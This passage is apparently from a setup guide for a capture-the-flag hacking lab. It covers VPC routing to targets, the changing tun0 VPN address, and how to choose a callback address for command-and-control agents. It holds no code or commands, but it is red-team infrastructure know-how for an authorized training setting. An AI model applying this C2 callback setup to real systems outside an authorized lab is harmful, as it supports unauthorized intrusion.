- **All internal machines can reach CTF targets.** Routing is configured at the VPC level. The Windows workstation, all C2 servers, and Guacamole can all reach targets through the tunnel.
- **tun0 IP is dynamic.** It changes with each VPN reconnect. Agents baked with the tun0 IP will stop working after a reconnect that assigns a different IP. Check the IP after each reconnect and regenerate agents if it changed.
- **Callback address choice.** If targets have internet access, use the public Elastic IP (stable, no regeneration needed). If targets are isolated to the VPN network only, use the tun0 IP with HTTP (port 80).

**Checkpoint:** Lab connected to external target environment, all internal machines can reach CTF targets
